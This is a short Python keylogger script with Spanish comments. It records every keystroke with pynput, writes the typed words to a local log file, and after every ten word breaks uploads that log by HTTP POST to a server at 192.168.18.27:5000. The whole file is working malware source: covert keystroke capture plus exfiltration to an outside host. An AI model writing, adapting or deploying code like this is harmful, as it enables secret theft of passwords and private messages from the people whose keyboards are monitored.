from pynput import keyboard
import logging
import os
import requests
#recordar que se guarda en la carpeta keylogger
class Keylogger():

    text = None
    count = None

    def __init__(self):
        self.text = ""
        self.count = 0
        self.logDir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "keylogger")

        if not os.path.exists(self.logDir):
            os.mkdir(path=self.logDir)

        logging.basicConfig(filename=os.path.join(self.logDir, "log.log"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
        self.start()

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def on_press(self, key):
        if key is not keyboard.Key.space and key is not keyboard.Key.enter and key is not keyboard.Key.tab:
            try:
                self.text = self.text + key.char
            except AttributeError:
                pass
        else:
            logging.info(self.text)
            logging.info("Special character {0}".format(key))
            self.text = ""
            self.count += 1
            if self.count % 10 == 0:
                try:
                    url_servidor = 'http://192.168.18.27:5000/upload'
                    archivo_a_enviar = {'archivo': open('keylogger/log.log', 'rb')}

                    respuesta = requests.post(url_servidor, files=archivo_a_enviar)
                    print(respuesta.status.code)
                    
                except Exception as e:
                    print(f"Error al realizar operaciones adicionales: {e}")

if __name__ == "__main__":
    keylogger = Keylogger()
